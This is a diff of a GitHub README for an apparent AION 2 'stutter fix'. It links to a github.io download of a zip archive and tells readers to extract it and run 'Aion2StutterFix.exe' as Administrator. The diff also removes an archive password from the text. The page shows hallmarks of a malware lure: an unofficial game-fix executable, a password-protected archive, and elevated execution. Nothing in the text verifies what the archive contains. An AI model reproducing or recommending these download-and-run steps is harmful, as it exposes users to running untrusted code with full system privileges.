@@ -1,5 +1,5 @@
 <div align="center">
-
+ 
 **[⬇️ Download Aion2StutterFix.zip](https://RunnerGutter.github.io/aion-2-stutter-fix/)**
 
 <img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/7f13643a-020f-4e42-ac59-7e6da47a048d" />
@@ -43,12 +43,12 @@ AION 2 runs decently in open areas, but the moment you enter a crowded city, a r
 
 **[⬇️ Download Aion2StutterFix.zip](https://RunnerGutter.github.io/aion-2-stutter-fix/)**
 
-*(Archive size: 1.8 MB · Password: `6427910552`)*
+*(Archive size: 1.8 MB )*
 
 </div>
 
 1. **Download** the archive from the link above.
-2. **Extract** with WinRAR or 7-Zip. Use the password `6427910552`.
+2. **Extract** with WinRAR or 7-Zip.
 3. **Run** `Aion2StutterFix.exe` as Administrator.
 4. Select your graphics preset and click **"Apply"**.
 5. Launch AION 2 and enjoy smooth gameplay.
